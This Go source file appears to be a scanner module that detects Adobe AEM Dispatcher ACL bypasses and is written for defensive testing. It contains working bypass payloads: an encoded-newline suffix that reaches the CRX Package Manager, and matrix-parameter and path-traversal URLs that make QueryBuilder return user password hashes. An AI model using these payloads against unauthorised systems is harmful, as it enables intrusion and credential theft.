package aem_dispatcher_bypass

import (
	"fmt"
	"strings"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	aem "github.com/vigolium/vigolium/pkg/modules/infra/aem"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
)

const reproduceRounds = 2

// newlineChain is the CRX Package Manager auth-bypass suffix (Detectify): a run
// of encoded-newline path parameters terminated by a permitted .css extension.
var newlineChain = strings.Repeat(";%0a", 16) + "a.css"

// check is one dispatcher-bypass target: a protected servlet path, the bypass
// variants to try against it, and the confirmation of the protected content.
type check struct {
	id          string
	name        string
	cleanPath   string
	bypassPaths []string
	confirm     func(res aem.ProbeResult) (evidence []string, sev severity.Severity, ok bool)
	tags        []string
	ref         []string
}

var checks = []check{
	{
		id:        "crx-packmgr-list",
		name:      "AEM CRX Package Manager Listing - Dispatcher Bypass",
		cleanPath: "/crx/packmgr/list.jsp?_charset_=utf-8&includeVersions=true",
		bypassPaths: []string{
			"/crx/packmgr/list.jsp" + newlineChain + "?_charset_=utf-8&includeVersions=true",
			"/content/..;/crx/packmgr/list.jsp" + newlineChain + "?_charset_=utf-8&includeVersions=true",
		},
		tags: []string{"crx", "package-manager", "auth-bypass"},
		ref:  []string{"https://labs.detectify.com/2016/11/09/analyzing-the-security-of-ebays-jsf-based-website/"},
		confirm: func(res aem.ProbeResult) ([]string, severity.Severity, bool) {
			if res.Status == 200 && aem.HasAll(res.Body, "buildCount", "downloadName", "acHandling") {
				return []string{"CRX package listing returned (buildCount/downloadName/acHandling)"}, severity.Critical, true
			}
			return nil, 0, false
		},
	},
	{
		id:        "querybuilder-matrix",
		name:      "AEM QueryBuilder - Dispatcher Matrix-Parameter Bypass",
		cleanPath: "/bin/querybuilder.json?path=/home/users&type=rep:User&p.hits=selective&p.properties=rep:password&p.limit=3",
		bypassPaths: []string{
			"/bin/querybuilder.json;x='x/graphql/execute/json/x'?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3",
			"/graphql/execute.json/..%2f../bin/querybuilder.json?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3",
		},
		tags: []string{"querybuilder", "credential-exposure", "auth-bypass"},
		ref:  []string{"https://blog.assetnote.io/2021/11/08/aem-vulnerabilities/"},
		confirm: func(res aem.ProbeResult) ([]string, severity.Severity, bool) {
			if res.Status != 200 || !aem.HasAll(res.Body, `"success":true`, `"results":`, `"hits":`) {
				return nil, 0, false
			}
			if strings.Contains(res.Body, "rep:password") {
				return []string{"QueryBuilder dumped rep:password via matrix-parameter bypass"}, severity.Critical, true
			}
			return []string{"QueryBuilder reachable via matrix-parameter dispatcher bypass"}, severity.High, true
		},
	},
}

type Module struct {
	modkit.BaseActiveModule
	ds dedup.Lazy[dedup.DiskSet]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeHost,
			modkit.AllInsertionPointTypes,
		),
		ds: dedup.LazyDiskSet("aem_dispatcher_bypass"),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) IncludesBaseCanProcess() bool { return false }

func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	return ctx != nil && ctx.Request() != nil
}

func (m *Module) ScanPerHost(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, nil
	}
	host := urlx.Host

	if !modkit.BeginHostProbeKey(scanCtx, httpClient, &m.ds, host) {
		return nil, nil
	}

	if !aem.ConfirmAEM(ctx, httpClient, scanCtx) {
		return nil, nil
	}

	baseURL := urlx.Scheme + "://" + urlx.Host
	var results []*output.ResultEvent
	for _, c := range checks {
		if res := m.runCheck(ctx, httpClient, scanCtx, c, baseURL); res != nil {
			results = append(results, res)
		}
	}
	return results, nil
}

// runCheck applies the differential: the protected content must NOT be served on
// the direct path (dispatcher blocking it) but MUST be served through a bypass
// variant, reproducibly. That pairing is what distinguishes a genuine ACL bypass
// from an endpoint that is simply open (which the exposure modules handle).
func (m *Module) runCheck(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
	c check,
	baseURL string,
) *output.ResultEvent {
	// Precondition: the direct path does not already serve the protected content.
	clean := aem.Get(ctx, httpClient, c.cleanPath, nil)
	if clean.OK {
		if _, _, ok := c.confirm(clean); ok {
			return nil // endpoint is simply open — not a dispatcher bypass
		}
	}

	for _, bp := range c.bypassPaths {
		res := aem.Get(ctx, httpClient, bp, nil)
		if !res.OK {
			continue
		}
		evidence, sev, ok := c.confirm(res)
		if !ok {
			continue
		}
		if modkit.ResemblesObservedPage(ctx, res.Body) {
			continue
		}
		// The bypass must reproduce, and the direct path must still be blocked on a
		// fresh fetch — so a flapping upstream is not mistaken for a bypass.
		if !aem.ReproduceMarker(ctx, httpClient, bp, reproduceRounds, func(r aem.ProbeResult) bool {
			_, _, rok := c.confirm(r)
			return rok
		}) {
			continue
		}
		if fresh := aem.Get(ctx, httpClient, c.cleanPath, nil); fresh.OK {
			if _, _, stillOpen := c.confirm(fresh); stillOpen {
				continue // direct path now serves it too → not a bypass
			}
		}
		return m.build(c, evidence, sev, bp, clean.Status, baseURL)
	}
	return nil
}

func (m *Module) build(
	c check,
	evidence []string,
	sev severity.Severity,
	bypassPath string,
	cleanStatus int,
	baseURL string,
) *output.ResultEvent {
	matchedURL := baseURL + bypassPath
	tags := append([]string{"aem", "adobe", "acl-bypass", "path-normalization"}, c.tags...)

	desc := fmt.Sprintf(
		"AEM Dispatcher ACL bypass: %s was blocked on the direct path (status %d) but served the protected content through the bypass %q, confirmed across %d rounds.",
		c.cleanPath, cleanStatus, bypassPath, reproduceRounds,
	)
	ev := append([]string{
		"check: " + c.id,
		"direct path (blocked): " + c.cleanPath,
		fmt.Sprintf("direct status: %d", cleanStatus),
		"bypass path: " + bypassPath,
	}, evidence...)

	return &output.ResultEvent{
		ModuleID:         ModuleID,
		Host:             aem.HostFromBase(baseURL),
		URL:              matchedURL,
		Matched:          matchedURL,
		MatcherStatus:    true,
		ExtractedResults: ev,
		Info: output.Info{
			Name:        c.name,
			Description: desc,
			Severity:    sev,
			Confidence:  severity.Certain,
			Tags:        tags,
			Reference: append([]string{
				"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf",
			}, c.ref...),
		},
	}
}
